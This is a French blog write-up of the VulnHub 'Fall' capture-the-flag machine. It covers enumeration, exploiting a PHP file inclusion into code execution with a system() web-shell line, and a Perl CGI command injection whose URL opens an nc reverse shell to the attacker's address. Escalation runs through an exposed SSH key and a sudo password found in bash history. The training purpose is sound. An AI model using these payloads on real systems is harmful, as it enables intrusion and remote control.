---
title: Solution du CTF Fall de VulnHub
tags: [VulnHub, CTF]
---


[digitalworld.local: FALL](https://vulnhub.com/entry/digitalworldlocal-fall,726/) est l'avant-dernier (à l'heure de ces lignes) CTF de la série *digitalworld.local* créé par *Donavan*.

Comme vous le constaterez par la suite, il s'adresse plutôt aux débutants qui veulent s'exercer en énumération web et système Unix.

```
Nmap scan report for 192.168.56.124
Host is up (0.00037s latency).
Not shown: 65441 filtered tcp ports (no-response), 81 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 7.8 (protocol 2.0)
| ssh-hostkey: 
|   2048 c586f96427a4385b8a11f9444b2aff65 (RSA)
|   256 e1000bcc5921696c1ac17722395a354f (ECDSA)
|_  256 1d4e146d20f456da65836f7d339df0ed (ED25519)
80/tcp    open   http        Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Good Tech Inc's Fall Sales - Home
111/tcp   closed rpcbind
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp   open   ssl/http    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2019-08-15T03:51:33
|_Not valid after:  2020-08-19T05:31:33
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Good Tech Inc's Fall Sales - Home
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
445/tcp   open   netbios-ssn Samba smbd 4.8.10 (workgroup: SAMBA)
3306/tcp  open   mysql       MySQL (unauthorized)
8000/tcp  closed http-alt
8080/tcp  closed http-proxy
8443/tcp  closed https-alt
9090/tcp  open   http        Cockpit web service 162 - 188
|_http-title: Did not follow redirect to https://192.168.56.124:9090/
10080/tcp closed amanda
10443/tcp closed cirrossp
MAC Address: 08:00:27:43:3E:C5 (Oracle VirtualBox virtual NIC)
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h20m05s, deviation: 4h02m29s, median: 1h00m05s
| smb2-time: 
|   date: 2023-03-13T21:15:59
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.10)
|   Computer name: fall
|   NetBIOS computer name: FALL\x00
|   Domain name: \x00
|   FQDN: fall
|_  System time: 2023-03-13T14:15:56-07:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Application non identifiée

Sur le port 9090 se trouve cette application web que Nmap semble reconnaître comme `Cockpit web service 162 - 188`. Quand on regarde le code source on voit effectivement des références à `Cockpit` mais sans plus de détails.

Dans le code javascript on peut lire cette référence :

```javascript
  "x-generator": "Zanata 4.6.2"
```

Sur `exploit-db` je trouve différents résultats pour `cockpit` mais ça ne semble pas correspondre, parfois l'exploit semble utiliser un port différent ce qui n'est pas engageant.

J'ai vu un exploit qui utilisait bien le port 9090, mais il ne semble n'avoir aucun effet.

L'appli web a d'ailleurs une présentation un peu trop officielle (avec logo *Fedora*) qui laisse penser qu'elle vient par défaut avec le système. Je passe donc mon tour.

## Pas pour cette fois

Sur le port 80 se trouve un *CMS Made Simple*. Vous trouverez des exemples d'exploitation en cherchant sur mon blog, mais ici l'appli ne semble pas vulnérable.

Ce qu'il faut retenir ici, c'est ce message posté par l'utilisateur `qiu` sur le CMS :

> Fellow administrators, stop polluting the webroot with all sorts of test scripts! This is production for heaven's sake!

J'ai donc procédé à une énumération web avec `feroxbuster` et la wordlist de dirbuster. Ça m'a remonté quelques noms de dossiers :

```
301        7l       20w      238c http://192.168.56.124/modules
301        7l       20w      238c http://192.168.56.124/uploads
301        7l       20w      234c http://192.168.56.124/doc
301        7l       20w      236c http://192.168.56.124/admin
301        7l       20w      237c http://192.168.56.124/assets
301        7l       20w      234c http://192.168.56.124/lib
301        7l       20w      234c http://192.168.56.124/tmp
403        9l       24w      223c http://192.168.56.124/ksiazka%2Eedu%2Epl
```

Finalement j'ai eu recours à la wordlist `raft-large-words.txt` de *FuzzDB* en spécifiant l'extension de fichier `php` pour la recherche. Ça m'a remonté ce script `test.php` qui se plaignait de ne pas avoir de paramètres reçus par `GET` (donc via la query string). J'utilise une wordlist contenant des noms de paramètres communs pour voir s'il y en a un qui provoque une réponse différente :

```console
$ ffuf -u "http://192.168.56.124/test.php?FUZZ=1" -w tools/wordlists/common_query_parameter_names.txt -fs 80

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.124/test.php?FUZZ=1
 :: Wordlist         : FUZZ: tools/wordlists/common_query_parameter_names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 80
________________________________________________

file                    [Status: 200, Size: 0, Words: 1, Lines: 1]
:: Progress: [5699/5699] :: Job [1/1] :: 329 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

Sans trop de surprise ce paramètre est vulnérable à un directory traversal : si on lui passe `/etc/passwd` on obtient la liste des utilisateurs.

Si on indique au script de se lire lui-même (`test.php?file=test.php`) le semble centre rentrer dans une boucle ce qui est signe qu'une inclusion a lieu et non un simple `file_gets_content` ou similaire.

C'est donc l'occasion de sortir [GitHub - synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) et de créer une chaine de filtres pour le code PHP suivant :

```php
<?php system($_GET["c"]); ?>
```

Avec ça je peux rapatrier reverse-ssh et obtenir un shell interactif.

## No security in this crazy world

Une fois sur le système, je fouille un peu dans la racine web.

```php
bash-4.4$ cat config.php 
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'P@ssw0rdINSANITY';
$config['db_name'] = 'cms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Asia/Singapore';
$config['db_port'] = 3306;
?>
```

Avec ce mot de passe je peux dumper les hashes du CMS mais aucun n'est trouvé par `crackstation.net`.

```
mysql> select * from cms_users;
+---------+----------+----------------------------------+--------------+------------+-----------+----------------------+--------+---------------------+---------------------+
| user_id | username | password                         | admin_access | first_name | last_name | email                | active | create_date         | modified_date       |
+---------+----------+----------------------------------+--------------+------------+-----------+----------------------+--------+---------------------+---------------------+
|       1 | qiu      | bc8b9059c13582d649d3d9e48c16d67f |            1 | qiu qing   | chan      | qiu@goodtech.inc     |      1 | 2021-05-21 17:06:29 | 2021-05-22 02:28:53 |
|       2 | patrick  | 6aea70cc6a678f0f83a82e1c753d7764 |            1 | Patrick    | Ong       | patrick@goodtech.inc |      1 | 2021-05-22 02:28:33 | 2021-05-22 16:54:13 |
+---------+----------+----------------------------------+--------------+------------+-----------+----------------------+--------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

Je remarque aussi des scripts dans `cgi-bin` dont l'un est vulnérable à une injection de commande (chemin exploitation alternatif) :

```perl
bash-4.4$ cat test.pl 
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "Welcome to Good Tech Inc Hint Corner.";
bash-4.4$ cat terriblescript.pl 
#!/usr/bin/perl -w

use strict;
use CGI ':standard';

print "Content-type: text/html\n\n";
my $file = param('file');
print "<P>You are previewing $file .";
system ("cat /var/www/html/$file");
```

On peut obtenir un shell `www-data` avec cette URL :

```
http://192.168.56.124/cgi-bin/terriblescript.pl?file=`nc%20-e%20/bin/bash%20192.168.56.1%207777`
```

Mais revenons à nos moutons... Il y a un utilisateur qiu sur le système et il est membre du groupe... `wheel`.

```
bash-4.4$ id qiu
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),10(wheel)
```

Sans doute une particularité du système `Fedora 28 (Server Edition)`. Il n'y a pas de groupe `sudo` sur la machine.

L'utilisateur a mis sa clé privée SSH en lecture pour tous :

```console
bash-4.4$ find / -user qiu -ls 2> /dev/null 
 50460117      0 -rw-rw----   1  qiu      mail            0 Aug 14  2019 /var/spool/mail/qiu
    27377      0 drwxr-xr-x   3  qiu      qiu           128 May 21  2021 /home/qiu
    27378      4 -rw-r--r--   1  qiu      qiu            18 Mar 15  2018 /home/qiu/.bash_logout
    27379      4 -rw-r--r--   1  qiu      qiu           193 Mar 15  2018 /home/qiu/.bash_profile
    27380      4 -rw-r--r--   1  qiu      qiu           231 Mar 15  2018 /home/qiu/.bashrc
    26322      4 -rw-r--r--   1  qiu      qiu            27 May 21  2021 /home/qiu/local.txt
   171666      0 drwxr-xr-x   2  qiu      qiu            61 May 21  2021 /home/qiu/.ssh
  1377102      4 -rwxrwxrwx   1  qiu      qiu          1831 May 21  2021 /home/qiu/.ssh/id_rsa
  1378060      4 -rwxrwxrwx   1  qiu      qiu           407 May 21  2021 /home/qiu/.ssh/id_rsa.pub
    72119      4 -rw-rw-r--   1  qiu      qiu            38 May 21  2021 /home/qiu/reminder
  1378059      4 -rw-------   1  qiu      qiu           292 Sep  5  2021 /home/qiu/.bash_history
```

On peut donc facilement se connecter sur son compte :

```console
bash-4.4$ cat /home/qiu/local.txt
A low privilege shell! :-)
bash-4.4$ cat /home/qiu/reminder
reminder: delete the SSH private key!
bash-4.4$ ssh -i .ssh/id_rsa qiu@127.0.0.1
Could not create directory '/usr/share/httpd/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:+P4Rs5s4ipya3/t+GBoy0WjQqL/LaExt9MFvWgld4xc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/usr/share/httpd/.ssh/known_hosts).
Web console: https://FALL:9090/

Last login: Sun Sep  5 19:28:51 2021
[qiu@FALL ~]$ id
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),10(wheel)
```

J'ai regardé s'il y avait quoi que ce soit à tirer de ce groupe `wheel` mais sans succès :

```console
[qiu@FALL ~]$ find / -group wheel 2>/dev/null 
/var/lib/cockpit
[qiu@FALL ~]$ ls -ald /var/lib/cockpit
drwxrwxr-x. 2 root wheel 6 Nov 28  2018 /var/lib/cockpit
[qiu@FALL ~]$ cd /var/lib/cockpit
[qiu@FALL cockpit]$ ls -al
total 4
drwxrwxr-x.  2 root wheel    6 Nov 28  2018 .
drwxr-xr-x. 53 root root  4096 Aug 15  2019 ..

```

Il ne nous restait que l'historique bash de l'utilisateur qu'on ne pouvait pas lire précédemment :

```bash
[qiu@FALL ~]$ cat .bash_history 
ls -al
cat .bash_history 
rm .bash_history
echo "remarkablyawesomE" | sudo -S dnf update
ifconfig
ping www.google.com
ps -aux
ps -ef | grep apache
env
env > env.txt
rm env.txt
lsof -i tcp:445
lsof -i tcp:80
ps -ef
lsof -p 1930
lsof -p 2160
rm .bash_history
exit
ls -al
cat .bash_history
exit
```

Le mot de passe qu'il a utilisé pour `sudo` est valide :

```console
[qiu@FALL ~]$ sudo su
[sudo] password for qiu: 
[root@FALL qiu]# cd /root
[root@FALL ~]# ls
anaconda-ks.cfg  original-ks.cfg  proof.txt  remarks.txt
[root@FALL ~]# cat proof.txt 
Congrats on a root shell! :-)
[root@FALL ~]# cat remarks.txt 
Hi!

Congratulations on rooting yet another box in the digitalworld.local series!

You may have first discovered the digitalworld.local series from looking for deliberately vulnerably machines to practise for the PEN-200 (thank you TJ_Null for featuring my boxes on the training list!)

I hope to have played my little part at enriching your PEN-200 journey.

Want to find the author? Find the author on Linkedin by rooting other boxes in this series!
```

## Alternative happy ending

Si on n'utilise pas la technique de chainage des filtres PHP alors transformer l'inclusion PHP en RCE peut être problématique. En effet, il n'y a ici aucun log à injecter. La seule solution semble de consulter `/etc/passwd`, voir qu'il y a un utilisateur `qiu` puis accéder à sa clé privée SSH. L'autre technique consiste à passer par le CGI Perl vulnérable.
